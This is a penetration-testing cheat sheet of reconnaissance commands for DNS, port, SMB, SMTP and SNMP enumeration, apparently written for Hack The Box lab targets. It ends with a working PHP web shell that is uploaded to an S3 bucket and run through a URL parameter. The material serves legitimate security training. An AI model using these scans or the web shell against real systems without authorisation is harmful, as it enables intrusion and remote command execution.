# Enumeration Cheat Sheet

## DNS Enumeration

### Custom Host Enumeration
```bash
for ip in $(cat list.txt); do host $ip.-host-.com; done
```

### PTR Record Scan
```bash
for ip in $(seq 200 254); do host -host-.$ip; done | grep -v "not found"
```

### Automated Recon
```bash
dnsrecon -d -host- -t std
dnsrecon -d -host- -D ~/list.txt -t brt
dnsenum
```

### Subdomain Enumeration
```bash
gobuster vhost -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://thetoppers.htb --append-domain
```

### Windows
```bash
nslookup
```

---

## TCP/UDP Enumeration

### Netcat Scanning

**TCP**
```bash
nc -nvv -w 1 -z <host> <port-port>
```

**UDP**
```bash
nc -nv -u -z -w 1 <host> <port-port>
```

### Nmap Sweep Scans

**Ping Sweep**
```bash
nmap -sn <host>
nmap -v -sn <host> -oG ping-sweep.txt
grep Up ping-sweep.txt | cut -d " " -f 2
```

**Port Scan**
```bash
nmap -p <port> <host> -oG web-sweep.txt
grep open web-sweep.txt | cut -d" " -f2
```

**OS Fingerprinting**
```bash
sudo nmap -O <host> --osscan-guess
nmap -sT -A <host> --aggressive
```

### Windows
```powershell
Test-NetConnection -Port 445 <host>
```

---

## SMB Enumeration

```bash
sudo nbtscan -r <network>/24
nmap -v -p 139,445 --script smb-os-discovery <host>
```

**Windows**
```powershell
net view \\dc01 /all
```

---

## SMTP Enumeration

**Manual User Verification**
```bash
nc -nv <host> 25
```

**Automated User Verification**
```bash
python3 smtp_verify.py <user> <host>
```

```python
#!/usr/bin/python
# smtp_verify.py
import socket, sys

if len(sys.argv) != 3:
    print("Usage: vrfy.py <username> <target_ip>")
    sys.exit(0)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
ip = sys.argv[2]
s.connect((ip, 25))
print(s.recv(1024))

user = (sys.argv[1]).encode()
s.send(b'VRFY ' + user + b'\r\n')
print(s.recv(1024))
```

**Windows**
```powershell
Test-NetConnection -Port 25 <host>
dism /online /Enable-Feature /FeatureName:TelnetClient
telnet <host> 25
```

---

## SNMP Enumeration

```bash
sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt

# Community strings
echo public > community
echo private >> community
echo manager >> community

# Host IPs
for ip in $(seq 1 254); do echo <host>.$ip; done > ips

# Scan with onesixtyone
onesixtyone -c community -i ips
```

**snmpwalk Queries**
```bash
snmpwalk -c public -v1 -t 10 <host>
snmpwalk -c public -v1 <host> 1.3.6.1.4.1.77.1.2.25      # Users
snmpwalk -c public -v1 <host> 1.3.6.1.2.1.25.4.2.1.2     # Processes
snmpwalk -c public -v1 <host> 1.3.6.1.2.1.25.6.3.1.2     # Installed Software
snmpwalk -c public -v1 <host> 1.3.6.1.2.1.6.13.1.3       # Listening TCP Ports
```

---

## AWS S3 Bucket Enumeration

```bash
# Check Auth
aws --endpoint=http://<host> s3 ls

# List Buckets
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb

# Upload Shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Access:
```
http://<host>/shell.php?cmd=id
```